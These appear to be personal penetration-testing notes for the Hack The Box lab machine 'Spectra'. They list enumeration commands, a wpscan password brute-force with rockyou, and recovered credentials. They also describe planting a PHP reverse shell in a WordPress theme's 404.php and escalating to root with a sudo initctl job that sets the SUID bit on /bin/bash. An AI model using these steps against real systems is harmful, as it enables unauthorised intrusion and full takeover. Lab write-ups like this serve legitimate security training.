# Spectra

/etc/hosts spectra.htb

**Port 80** 

1. Jira
``` bash 
curl -s 10.10.10.229 | grep -i "jira" 1>/dev/null && echo "OK"
```

2. WordPress 
``` bash 
curl -s http://spectra.htb/main/ | grep -i "wordpress" 1>/dev/null && echo "OK"
wpscan --url http://spectra.htb/main/ -e u
wpscan --url http://spectra.htb/main/ 
wpscan --url http://spectra.htb/main --passwords ~/Downloads/rockyou.txt --usernames user -t 50
```

3. dir
``` bash
wfuzz -c -z file,/opt/node-dirbuster/lists/directory-list-2.3-medium.txt --hc 404 http://spectra.htb/FUZZ
```
user : user (wp)
devtest: devteam01 (db)


### dir

> main
*wp*

> testing 
*index-of*

> files 
wp-admin/                                          
wp-content/                                       
wp-includes/                                       
index.php                                          
license.txt                                        
readme.html                                        
wp-activate.php                                    
wp-blog-header.php                                 
wp-comments-post.php                               
wp-config.php                                      
wp-config.php.save
wp-cron.php                                        
wp-links-opml.php                                  
wp-load.php                                        
wp-login.php                                       
wp-mail.php                                        
wp-settings.php                                    
wp-signup.php                                    
wp-trackback.php                                   
xmlrpc.php 


**PORT 22** 

failed access 


**PORT 3306** 


reverse shell - https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
http://spectra.htb/main/wp-content/themes/twentyseventeen/404.php


> connect with user no db, failed 

```
root:x:0:0:root:/root:/bin/bash
chronos:x:1000:1000:system_user:/home/chronos/user:/bin/bash
nginx:x:20155:20156::/home/nginx:/bin/bash
katie:x:20156:20157::/home/katie:/bin/bash
```



cat /etc/issue
```
Developer Console
To return to the browser, press:

  [ Ctrl ] and [ Alt ] and [ <- ]  (F1)

To use this console, developer mode must be enabled.
Doing so will destroy any saved data on the system.

In developer mode, it is possible to
- login and sudo as user 'chronos'
- require a password for sudo and login(*)
- disable power management behavior (screen dimming):
  sudo initctl stop powerd
- install your own operating system image!

* To set a password for 'chronos', run the following as root:

chromeos-setdevpasswd

If you are having trouble booting a self-signed kernel, you may need to
enable USB booting.  To do so, run the following as root:

enable_dev_usb_boot

Have fun and send patches!
```

**LinPeas**

bash-4.3$ cat /etc/autologin/passwd
cat /etc/autologin/passwd
user:user

grupos? 
sudo?

NOPASSWD(initctl)

sudo -u root /sbin/initctl list

vim /etc/init/test.conf 
script 
	chmod +s /bin/bash
end script